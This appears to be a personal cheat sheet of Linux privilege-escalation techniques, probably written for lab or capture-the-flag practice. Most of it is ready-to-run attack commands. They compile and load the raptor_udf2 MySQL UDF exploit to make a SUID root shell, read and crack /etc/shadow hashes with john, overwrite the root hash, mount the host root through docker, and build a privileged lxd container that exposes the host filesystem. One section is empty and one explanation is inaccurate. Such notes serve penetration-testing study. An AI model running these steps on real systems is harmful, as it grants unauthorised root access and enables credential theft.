# Linux Privlage Escalation
### Service Exploits
- https://www.exploit-db.com/exploits/1518
- The mysql service is running as root and the 'root' user for the service does not have a password assigned or the password is known. This exploit takes advantage of the User Defined Functions (UFDs) to run system commands as root via the mysql service.
- Change into the `/home/user/tools/mysql-udf` directory.
```
cd /home/user/tools/mysql-udf
```
- Compile the raptor_udf2.c exploit code using the following
```
gcc -g -c raptor_udf2.c -fPIC
gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc
```
- Connect to the mysql service as the root user with a blank or known password.
```
mysql -u root
```
- Execute the following commands on the mysql shell to create a udf "do_system" using the compiled exploit
```
use mysql;
create table foo(line blob);
insert into foo values (load_file('/home/user/tools/mysql-udf/raptor_udf2.so'));
select * from foo into dumpfile '/usr/lib/mysql/plugin/raptor_udf2.so';
create function do_system returns integer soname 'raptor_udf2.so';
```
- Use the function to copy /bin/bash to /tmp/rootbash and set the SUID permission
```
select do_system('cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash');
```
- Exit out of the mysql shell
```
\q
```
- Run /tmp/rootbash with -p to gain a root shell
`/tmp/rootbash -p`

### Weak File Permissions - Readable /etc/shadow
```
ls -l /etc/shadow
cat /etc/shadow
```
- A users password hash (if they have one) can be found between the first and second (:) of each line.
- Save the root user's hash to a file called hash.txt on your kali machine and use john to crack it.
```
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```
- Switch to the root user
```
su root
```
### Weak File Permissions - Writeable /etc/shadow
```
ls -l /etc/shadow
```
- Generate a new password hash
```
mkpasswd -m sha-512 jackiscool
```
- Edit /etc/shadow and replace origional root user's password hash with the one that you just created
- Switch to the root user
```
su root
```
### Weak File Permissions - Writable /etc/passwd
- The /etc/passwd file contained user password hashes, and some versions of Linux still allow password hashes to be stored there
- 
### Docker Linux Local PE
```
id
```
- Check to see if the user is in the docker group
```
docker run hello-world
```
- Check to see if docker is installed and working correctly
```
docker run -v /root:/mnt alpine cat /mnt/key.txt
```
- `-v` specifies a volume to mount, in this case the /root directory on the house was mounted to the /mnt directory on the container.  Because docker has SUID we were able to mount a root owned directory in our container
```
docker run -it -v /:/mnt alpine chroot /mnt
```
- Roots the host with docker because we used chroot on the /mnt directory.  This allowed us to use the host operating system.
```
docker run -it ubuntu bash
```
- Optional: Run an ubuntu container with docker
### lxd Group Priv Esc
- Exploit without internet connection
- Change to the root user
```
sudo su
```
- Install Requirements on your attack box
```
sudo apt update
sudo apt install -y golang-go debootstrap rsync gpg squashfs-tools
```
- Clone the repo
```
sudo go get -d -v github.com/lxc/distrobuilder
```
- Make distrobuilder
```
cd $HOME/go/src/github.com/lxc/distrobuilder
make
```
- Prepare the creation of Alpine
```
mkdir -p $HOME/ContainerImages/alpine/
cd $HOME/ContainerImages/alpine/
wget https://raw.githubusercontent.com/lxc/lxc-ci/master/images/alpine.yaml
```
- Create the container
```
sudo $HOME/go/bin/distrobuilder build-lxd alpine.yaml
```
-If that fails, run it adding `-o image.release=3.8` at the end
- Errors
- If you recieve an `Failed container creation: No storage pool found. Please create a new storage pool.`
- You need to initialize lxd before using it
```
lxd init
```
- Read the options and use the defaults
- Upload `lxd.tar.xz` and `rootfs.squashfs` to the vulnerable server
- Add the image on the vulnerable server
```
lxc image import lxd.tar.xz rootfs.squashfs --alias alpine
lxc image list
```
- Second command is only if you want to confim the imported image is present
- Create a container and add the root path
```
lxc init alpine privesc -c security.privileged=true
lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true
```
- Execute the container
```
lxc start privesc
lxc exec privesc /bin/sh
cd /mnt/root
```
- `/mnt/root` is where the file system is mounted.

